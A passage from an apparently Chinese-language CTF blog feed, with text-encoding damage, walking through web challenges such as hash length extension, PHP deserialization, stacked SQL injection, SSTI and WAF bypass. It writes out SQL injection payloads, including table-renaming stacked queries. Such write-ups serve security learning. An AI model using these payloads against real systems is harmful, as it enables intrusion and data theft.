alt=""><br>å°†roleæ”¹ä¸ºadminå¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œé¢˜ç›®è¯´æœ‰ä¸œè¥¿æ²¡åˆ æ‰æ‰€ä»¥åº”è¯¥æœ‰å¤‡ä»½çš„æ–‡ä»¶å°è¯•phpsï¼Œphpæ— æœå</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8yesvgfj30a9040745.jpg" alt=""></p><p>å°è¯•.swpå‘ç°æœ‰æ–‡ä»¶<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm93jm1aij30ui0oedhh.jpg" alt=""><br>æˆ‘ä»¬å¯ä»¥ç”¨vim -rå‘½ä»¤å»å›å¤å¤‡ä»½æ–‡ä»¶vim -r admin.php.swpï¼Œå‘ç°æºä»£ç </p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm93w2a57j30d907maa6.jpg" alt=""></p><p>è¿™é¢˜è€ƒçš„æ˜¯<strong>hashé•¿åº¦æ‹“å±•æ”»å‡»</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm94dafa8j30nz05et8y.jpg" alt=""><br>æˆ‘ä»¬å¯ç”¨hashpumpè¿™ä¸ªå·¥å…·æ¥ä¼ªé€ adminçš„èº«ä»½ï¼Œè®°å¾—è¦æŠŠæ•°æ®URLç¼–ç ä¸€ä¸‹<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm94srt1bj30uo0ewgmr.jpg" alt=""><br>æœ€åè·å¾—flag</p><h2 id="7ã€Logic"><a href="#7ã€Logic" class="headerlink" title="7ã€Logic"></a>7ã€Logic</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm95vhznzj30h20cb0sr.jpg" alt=""><br>æŸ¥çœ‹æºä»£ç <br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm96ado7qj30k307st99.jpg" alt=""><br>å‘ç°ä¸€ä¸ªphpï¼Œè®¿é—®å®ƒ<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm96tditmj30hj044weg.jpg" alt=""><br>åˆæ˜¯è¯´ä¸æ˜¯adminï¼Œç»§ç»­æŠ“åŒ…<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9765sbej30op0aht9f.jpg" alt=""><br>æ²¡ä»€ä¹ˆå‘ç°ï¼Œæ‰€ä»¥çŒœæµ‹å’Œä¸Šé¢˜ä¸€æ ·æœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•.swp</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm97hw289j30s90asdgp.jpg" alt=""></p><p>å‘ç°ä»£ç ï¼Œè¯´æ˜tokenæ˜¯10ä¸ª0</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm97qbd5sj30lh08f752.jpg" alt=""></p><p>å†æ¬¡æŸ¥çœ‹æºä»£ç å‘ç°adminæ˜¯chenyuruié‚®ç®±æ ¼å¼æ˜¯gmailï¼Œ<br>è€Œä¸”è¿™é‡Œæ˜¾ç¤ºäº†ç¼–è¾‘å™¨æ˜¯Vimï¼Œè€ŒVimç¼–è¾‘å™¨çš„å¤‡ä»½æ–‡ä»¶æ˜¯.swpã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm986xpotj30jr0bkmx8.jpg" alt=""><br>ç„¶åç™»é™†</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm98pkqi0j30bm02o743.jpg" alt=""></p><p>è·å¾—flag</p><h2 id="8ã€å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡"><a href="#8ã€å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡" class="headerlink" title="8ã€å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡"></a>8ã€å¬è¯´ä½ ä¼šé¢å‘å¯¹è±¡</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm99z1ziej30mj0mbwg1.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9a8er4ij30pj03sq30.jpg" alt=""></p><p>æ‰“å¼€å‘ç°é¢˜ç›®æºä»£ç </p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9agzpb9j30oi0c3gmf.jpg" alt=""></p><p>å‘ç°æ˜¯PHPåç³»åˆ—åŒ–é¢˜ç›®<br><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener" title="ååºåˆ—åŒ–ä»‹ç»">https://www.freebuf.com/articles/web/167721.html</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9bbjlebj30ca0duq3a.jpg" alt=""></p><p>æ‰€ä»¥å†™ä¸€ä¸ªphpæ„é€ è¿™ä¸ªåºåˆ—<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9byp377j30ar018742.jpg" alt=""></p><p>ç„¶åç”¨GETæ–¹å¼ä¼ data<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9cnwtx1j30gd0a2dgf.jpg" alt=""><br>å‘ç°é”™è¯¯ï¼Œæ‰€ä»¥æ˜¯_wakeupå‡½æ•°çš„é—®é¢˜ï¼ŒPHPå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§æ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9d3rp30j30h305w0so.jpg" alt=""><br>æ‰€ä»¥æŠŠAdminåçš„æ•°å€¼æ”¹å¾—æ¯”1å¤§å°±å¾—åˆ°flag</p><h2 id="9ã€ä¸Šä¼ ä¸‰"><a href="#9ã€ä¸Šä¼ ä¸‰" class="headerlink" title="9ã€ä¸Šä¼ ä¸‰"></a>9ã€ä¸Šä¼ ä¸‰</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9dxf9caj30p804oglj.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9e53ia8j30z50dv762.jpg" alt=""><br>php,php2,php3,php4,php5ç­‰éƒ½è¿‡æ»¤æ‰äº†ï¼Œç›´åˆ°è¯•åˆ°phtmlçš„æ—¶å€™å›æ˜¾å‡ºæ¥ä¸€å¥è¯ï¼Œå‘ç°æ˜¯<strong>æ¡ä»¶ç«äº‰</strong>é¢˜ç›®<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9emdwhsj30m905jdfx.jpg" alt=""><br>äºæ˜¯å†™è„šæœ¬<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9evxlg6j30dr00wq2r.jpg" alt=""></p><p>è€å¿ƒç­‰å¾…å‡ åˆ†é’Ÿä»è€Œè·å¾—flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h1 id=&quot;å…¥é—¨é¢˜ï¼š&quot;&gt;&lt;a href=&quot;#å…¥é—¨é¢˜ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å…¥é—¨é¢˜ï¼š&quot;&gt;&lt;/a&gt;å…¥é—¨é¢˜
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="cumt" scheme="https://devildragons.github.io/tags/cumt/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJé¢˜è§£</title>
    <link href="https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/"/>
    <id>https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/</id>
    <published>2020-06-08T16:00:00.000Z</published>
    <updated>2020-09-22T14:53:45.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUOJ"><a href="#BUUOJ" class="headerlink" title="BUUOJ"></a><em>BUUOJ</em></h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9opzsedcj307q02g3yd.jpg" alt=""></p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æå‡ï¼Œæ‰“å¼€source.phpé¡µé¢</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm4uifequj30no0oxdhl.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm4uzwofrj30rp07zt9a.jpg" alt=""><br>çœ‹åˆ°é¢˜ç›®phpä»£ç </p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9otp9bbhj30k902qweh.jpg" alt=""></p><p>æ‰“å¼€hint.phpé¡µé¢ï¼Œå‘ç°æç¤ºã€‚<br>å›åˆ°source.phpé¡µé¢ï¼Œå‡½æ•°ä»£ç ä¸­æœ‰å››ä¸ªifè¯­å¥</p><pre><code>ç¬¬ä¸€ä¸ªifè¯­å¥å¯¹å˜é‡è¿›è¡Œæ£€éªŒï¼Œè¦æ±‚$pageä¸ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™è¿”å›falseç¬¬äºŒä¸ªifè¯­å¥åˆ¤æ–­$pageæ˜¯å¦å­˜åœ¨äº$whitelistæ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›trueç¬¬ä¸‰ä¸ªifè¯­å¥åˆ¤æ–­æˆªå–åçš„$pageæ˜¯å¦å­˜åœ¨äº$whitelistæ•°ç»„ä¸­ï¼Œæˆªå–$pageä¸­&apos;?&apos;å‰éƒ¨åˆ†ï¼Œå­˜åœ¨åˆ™è¿”å›trueç¬¬å››ä¸ªifè¯­å¥åˆ¤æ–­urlè§£ç å¹¶æˆªå–åçš„$pageæ˜¯å¦å­˜åœ¨äº$whitelistä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›trueè‹¥ä»¥ä¸Šå››ä¸ªifè¯­å¥å‡æœªè¿”å›å€¼ï¼Œåˆ™è¿”å›false</code></pre><p>æœ‰ä¸‰ä¸ªifè¯­å¥å¯ä»¥è¿”å›trueï¼Œç¬¬äºŒä¸ªè¯­å¥ç›´æ¥åˆ¤æ–­$pageï¼Œä¸å¯ç”¨<br>ç¬¬ä¸‰ä¸ªè¯­å¥æˆªå–â€™?â€™å‰éƒ¨åˆ†ï¼Œç”±äº?è¢«åéƒ¨åˆ†è¢«è§£æä¸ºgetæ–¹å¼æäº¤çš„å‚æ•°ï¼Œä¹Ÿä¸å¯åˆ©ç”¨<br>ç¬¬å››ä¸ªifè¯­å¥ä¸­ï¼Œå…ˆè¿›è¡Œurlè§£ç å†æˆªå–ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†?ç»è¿‡ä¸¤æ¬¡urlç¼–ç ï¼Œåœ¨æœåŠ¡å™¨ç«¯æå–å‚æ•°æ—¶è§£ç ä¸€æ¬¡ï¼ŒcheckFileå‡½æ•°ä¸­è§£ç ä¸€æ¬¡ï¼Œä»ä¼šè§£ç ä¸ºâ€™?â€™ï¼Œä»å¯é€šè¿‡ç¬¬å››ä¸ªifè¯­å¥æ ¡éªŒã€‚ï¼ˆâ€™?â€™ä¸¤æ¬¡ç¼–ç å€¼ä¸ºâ€™%253fâ€™ï¼‰,æ„é€ urlï¼š<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p1nmo3rj30rv037wej.jpg" alt=""><br>æ— è¿”å›å€¼ï¼Œç”±äºæˆ‘ä»¬ä¸çŸ¥é“ffffllllaaaaggggæ–‡ä»¶çš„å…·ä½“ä½ç½®ï¼Œåªèƒ½ä¾æ¬¡å¢åŠ ../ï¼Œæœ€ç»ˆåœ¨<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p3bfc4bj30x205r750.jpg" alt=""><br>ä¸­æˆåŠŸå›æ˜¾flag</p><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p6owmc0j30x304waah.jpg" alt=""><br>è¯¥é¢˜è€ƒæŸ¥<strong>å †å æ³¨å…¥</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pd5u3nfj31bi0520t3.jpg" alt=""><br>è¾“å…¥1â€™æäº¤é¡µé¢ä¸æ­£å¸¸</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9peqna3ij30cd0hk750.jpg" alt=""></p><p>è¾“å…¥1â€™ or 1=1 #ï¼Œé¡µé¢å˜ä¸ºæ­£å¸¸ï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pj0d3nzj30hi04s0st.jpg" alt=""></p><p>è¾“å…¥1â€™ order by 3#ï¼Œé¡µé¢å‡ºç°é”™è¯¯ï¼Œè¯´æ˜åªæœ‰ä¸¤ä¸ªå­—æ®µ</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pl8yxfrj30mn04jq2x.jpg" alt=""></p><p>ä½¿ç”¨union selectæŸ¥è¯¢ï¼Œå‘ç°å¾ˆå¤šè¯­å¥è¢«è¿‡æ»¤ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pso2bowj30kg0mx0tm.jpg" alt=""></p><p>ä½¿ç”¨å †å æ³¨å…¥1â€™;show databases; #åˆ—å‡ºæ•°æ®åº“åã€‚</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pvbzlxlj30hx0gmgma.jpg" alt=""></p><p>æ¥ç€ä½¿ç”¨1â€™;show tables;#æŸ¥è¯¢å‡ºè¡¨</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9px8yi8cj309g0o6dgo.jpg" alt=""></p><p>ä½¿ç”¨1â€™;show columns from words;#æŸ¥å‡ºè¡¨wordsçš„å­—æ®µ</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9q1mxqi0j30bk0h3q3i.jpg" alt=""></p><p>ç„¶åä½¿ç”¨<code>1&#39;;show columns from `1919810931114514`;#</code>æŸ¥å‡ºè¡¨1919810931114514çš„å­—æ®µ(å¦‚æœè¡¨åä¸ºçº¯æ•°å­—ï¼Œåˆ™éœ€è¦åŠ ä¸Š`),ä»è€Œå‘ç°flagå­—æ®µã€‚</p><p>å› ä¸ºè¿™é‡Œæœ‰ä¸¤å¼ è¡¨ï¼Œä¼šå¿å†…å®¹è‚¯å®šæ˜¯ä»wordè¿™å¼ è¡¨ä¸­å›æ˜¾çš„ï¼Œé‚£æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½è®©å®ƒå›æ˜¾flagæ‰€åœ¨çš„è¡¨å‘¢</p><p>å†…éƒ¨æŸ¥è¯¢è¯­å¥ç±»ä¼¼ : select id, data from word where id =</p><p>(è¿™é‡Œä»ä¸Šé¢çš„å¯¹wordåˆ—çš„æŸ¥è¯¢å¯ä»¥çœ‹åˆ°å®ƒæ˜¯æœ‰ä¸¤åˆ—ï¼Œidå’Œdata)</p><p>ç„¶å1919810931114514åªæœ‰ä¸€ä¸ªflagå­—æ®µ</p><p>è¿™æ—¶å€™è™½ç„¶æœ‰å¼ºå¤§çš„æ­£åˆ™è¿‡æ»¤ï¼Œä½†æ²¡æœ‰è¿‡æ»¤alertå’Œrenameå…³é”®å­—</p><p>è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å·²ä¸‹é¢çš„éªšå§¿åŠ¿è¿›è¡Œæ³¨å…¥ï¼š</p><p>1.å°†wordsè¡¨æ”¹åä¸ºword1æˆ–å…¶å®ƒä»»æ„åå­—</p><p>2.1919810931114514æ”¹åä¸ºwords</p><p>3.å°†æ–°çš„wordè¡¨æ’å…¥ä¸€åˆ—ï¼Œåˆ—åä¸ºid</p><p>4.å°†flagåˆ—æ”¹åä¸ºdata</p><p>æ„é€ payload</p><pre><code>1&apos;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</code></pre><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9q65ogotj30io06mq32.jpg" alt=""></p><p>ç„¶åä½¿ç”¨1â€™ or 1=1 #æŸ¥è¯¢è·å¾—flag.</p><p>ç¬¬äºŒç§æ–¹æ³•ï¼Œå‚è€ƒ[GYCTF2020]Blacklist<br>æ„é€ Payload:</p><pre><code>1&apos;;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;#</code></pre><p>è·å¾—flagã€‚</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>åŒæ ·æ˜¯è€ƒå¯Ÿå †å æ³¨å…¥</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qe0hjvej30g7046746.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qhhl6mej30eo04q0sn.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qhqxmofj30ev04x747.jpg" alt=""></p><p>è¾“å…¥1å‘ç°é¡µé¢æœ‰å›æ˜¾ï¼Œè¾“å…¥1-1æ•°å€¼æ”¹å˜ï¼Œè¯´æ˜æ˜¯æ•°å€¼å‹çš„æ³¨å…¥ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qkfyws7j31cl044wen.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qkzny0hj30er03mwef.jpg" alt=""></p><p>ä¾æ¬¡æŸ¥è¯¢æ•°æ®åº“å¹¶æŸ¥è¯¢å‡ºè¡¨ï¼Œå¹¶å‘ç°Flagè¡¨</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qnjgiugj30fr032gli.jpg" alt=""></p><p>ä½†å‘ç°from Flagè¢«è¿‡æ»¤æ‰€ä»¥ä¸èƒ½ç›´æ¥è¯»å–flag</p><p>çœ‹äº†åˆ«äººçš„é¢˜è§£çŸ¥é“æœ¬é¢˜çš„åŸç†</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qpv9tp0j30cy01kdfn.jpg" alt=""></p><p>è§£é¢˜æ€è·¯1ï¼š</p><p>payloadï¼š<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qtrqv9hj301e00y0dl.jpg" alt=""></p><p>æŸ¥è¯¢è¯­å¥ï¼š<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qt6po3gj307f00xmwx.jpg" alt=""></p><p>è§£é¢˜æ€è·¯2ï¼š</p><p>payload:1;</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qsq9fjbj30b100uwea.jpg" alt=""></p><p>è§£æï¼š</p><pre><code>åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ã€‚ä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_modeæ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚</code></pre><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>æœ¬é¢˜è€ƒæŸ¥<strong>ssti(æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥)</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa6dsmr9j309h043745.jpg" alt=""></p><p>æ‰“å¼€é¡µé¢å‘ç°3ä¸ªæ–‡ä»¶</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa8gc7ajj307n02h742.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaeo8xoej30x601m0ss.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa8smxbmj304w029we9.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaf34iioj30wh01vglo.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa91n0zhj30b9026glf.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaafapucfj30ux01qmx7.jpg" alt=""></p><p>ä¾æ¬¡æ‰“å¼€ä¸‰ä¸ªtxtæ–‡ä»¶å¾—åˆ°æç¤ºï¼Œæ‰€ä»¥éœ€è¦çŸ¥é“cookie_secretã€‚</p><p><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener" title="renderå‡½æ•°ä»‹ç»">https://blog.csdn.net/qq78827534/article/details/80792514</a></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaai2hq1uj30uu01w0ss.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaiwi6ifj308f036dfm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaj6kp2cj30jz025mx4.jpg" alt=""></p><p>åªä¿®æ”¹æ–‡ä»¶åä¸ä¿®æ”¹æ–‡ä»¶hashå€¼ï¼ŒæŠ¥é”™ã€‚</p><p>å¯ä»¥çœ‹åˆ°åœ¨æŠ¥é”™çš„urlä¸­å‚æ•°msgå€¼ä¸ºErrorï¼Œç„¶åç•Œé¢å°±æ˜¾ç¤ºErrorã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaovcufmj30xt0330sy.jpg" alt=""><br>ç»§ç»­ä¿®æ”¹è¯å®æ­¤å¤„å­˜åœ¨æ¨¡æ¿æ³¨å…¥<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaqglp4mj31ap0h9403.jpg" alt=""><br>åœ¨è¿™é‡Œæˆ‘ä»¬åº”è¯¥å¯ä»¥å¾—åˆ°cookie_secret</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaas3fnwdj30b9026glf.jpg" alt=""></p><p>ç„¶åç…§ç€hintè§£å‡ºæ–‡ä»¶å¾—hashå€¼</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaax5makhj314h0hk3zl.jpg" alt=""></p><p>ä»è€Œè·å¾—flagã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab2fglexj31540jsgzp.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab3fdaq7j30cx0bc42b.jpg" alt=""></p><p>å°è¯•ä¸‡èƒ½å¯†ç <br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab4aph2oj30pp0d8qa3.jpg" alt=""></p><p>è·å¾—flag.</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab99x02cj315207oglp.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab8totonj30ln066aap.jpg" alt=""></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤ºæ‰€ä»¥éœ€è¦ç»•è¿‡WAFã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabgnz7w1j30v30bpt9s.jpg" alt=""></p><p>æŸ¥çœ‹calc.phpé¡µé¢ï¼Œæ˜¾ç¤ºäº†wafçš„æ³•åˆ™ã€‚</p><p>è¿›è¡Œç»•wafï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹phpçš„è§£æè§„åˆ™ï¼Œå½“phpè¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¦‚æœå˜é‡å‰é¢æœ‰ç©ºæ ¼ï¼Œä¼šå»æ‰å‰é¢çš„ç©ºæ ¼å†è§£æï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ç»•è¿‡wafã€‚</p><p>numè¢«é™åˆ¶äº†ï¼Œé‚£ä¹ˆâ€™  numâ€™å‘¢ï¼Œåœ¨numå‰é¢åŠ äº†ç©ºæ ¼ã€‚wafå°±ç®¡ä¸ç€äº†ï¼Œå› ä¸ºwafåªæ˜¯é™åˆ¶äº†numï¼Œwafå¹¶æ²¡æœ‰é™åˆ¶â€™  numâ€™ï¼Œå½“phpè§£æçš„æ—¶å€™ï¼Œåˆä¼šæŠŠâ€™   numâ€™å‰é¢çš„ç©ºæ ¼å»æ‰åœ¨è§£æï¼Œåˆ©ç”¨è¿™ç‚¹æ¥ä¸Šä¼ éæ³•å­—ç¬¦</p><p>æ„é€ payloadæ¥æŸ¥çœ‹ç›®å½•ï¼Œç”¨chrè½¬åŒ–æˆascllç è¿›è¡Œç»•è¿‡<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabuatrf6j31gu0hgtaf.jpg" alt=""><br>å‘ç° string(5) â€œf1aggâ€<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabyjc1ynj31250h9my7.jpg" alt=""><br>æŸ¥çœ‹flagã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfac0kkj6ej30ek07yjrq.jpg" alt=""></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤º<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfac1m4l3kj31820ejgmy.jpg" alt=""></p><p>æ„é€ payloadè·å¾—flagã€‚</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>å­˜åœ¨ä»¥ä¸‹ä¸‰ç§è§£æ³•ï¼š</p><pre><code>flask session ä¼ªé€ unicodeæ¬ºéª—æ¡ä»¶ç«äº‰</code></pre><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaglrpya9j30mk0h7js1.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagmn0wcij30ia09h3yk.jpg" alt=""></p><p>æ³¨å†Œä¸€ä¸ªtestç”¨æˆ·ï¼Œç™»å½•ã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagoh0dvwj30ry08udh3.jpg" alt=""><br>åœ¨ä¿®æ”¹å¯†ç çš„æºç ä¸­å‘ç°æç¤ºã€‚<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagqd7i8tj30m70avaay.jpg" alt=""></p><p>ä¸‹è½½æ–‡ä»¶</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaijmd63ej30jw03edfv.jpg" alt=""></p><p>æ˜¯ä¸€ä¸ªflaské¡¹ç›®ï¼Œé‚£å°±ç›´æ¥å…ˆå¥”è·¯ç”±å»çœ‹ä¸€ä¸‹ï¼Œæ‰“å¼€route.pyï¼Œçœ‹ä¸€ä¸‹indexçš„æ³¨å†Œå‡½æ•°ä»£ç </p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaikmtd1aj30qx09at9f.jpg" alt=""><br>å‘ç°indexæ³¨å†Œå‡½æ•°æ²¡åšä»€ä¹ˆå¤„ç†ï¼Œç›´æ¥è¿”å›index.htmlæ¸²æŸ“æ¨¡ç‰ˆï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸€ä¸‹templates/index.htmlä»£ç </p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaiovsvsej30ql0ndmza.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaip70juwj30pc0fyt9w.jpg" alt=""></p><p>å‘ç°çœŸçš„æ˜¯è¦ç™»å½•æˆadminæ‰èƒ½å¾—åˆ°flagã€‚äºæ˜¯ç»§ç»­çœ‹å‘route.pyæ–‡ä»¶ï¼Œçœ‹çœ‹loginå’Œchange passwordçš„æ³¨å†Œå‡½æ•°å¤„ç†ä»£ç æ˜¯æ€ä¹ˆå†™çš„ã€‚</p><p><strong>è§£æ³•ä¸€ â€”â€” flask session ä¼ªé€ 